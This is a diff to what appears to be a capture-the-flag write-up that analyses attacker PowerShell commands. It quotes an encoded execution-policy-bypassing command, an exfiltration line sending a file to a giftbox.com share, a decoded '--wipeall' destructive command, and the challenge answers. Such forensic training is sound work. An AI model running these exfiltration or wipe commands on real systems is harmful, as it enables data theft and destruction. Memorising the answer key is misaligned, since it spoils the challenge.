@@ -86,6 +86,10 @@ C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc W1N0UmlOZ10
 ```powershell
 downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
 ```
+---------------
+- What is the name of the executable the attackers used in the final malicious command? ```downwithsanta.exe```
+- What was the command line flag used alongside this executable? ```--wipeall```
+
 #### Powershell 3 Analysis
 ```powershell
 C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
